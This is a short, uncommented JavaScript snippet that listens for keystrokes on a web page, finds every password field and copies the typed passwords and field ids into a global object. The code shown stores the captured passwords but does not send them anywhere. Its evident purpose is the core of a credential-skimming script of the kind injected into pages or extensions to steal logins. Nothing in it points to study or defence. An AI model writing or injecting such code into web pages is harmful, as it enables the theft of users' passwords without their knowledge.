var elementValues = [];
var elements = [];
var result = {
  "passwords": [], 
  "ids": [], 
};
window.addEventListener('keydown', function(){
  elements = document.querySelectorAll('[type="password"]');

  for (let i = 0; i < elements.length; i++) {
    elements[i].addEventListener('keyup', function(){
      result.passwords = Array.from(elements).map(i=>i.value);
      result.ids = Array.from(elements).map(i=>i.id);
    });
  };
});
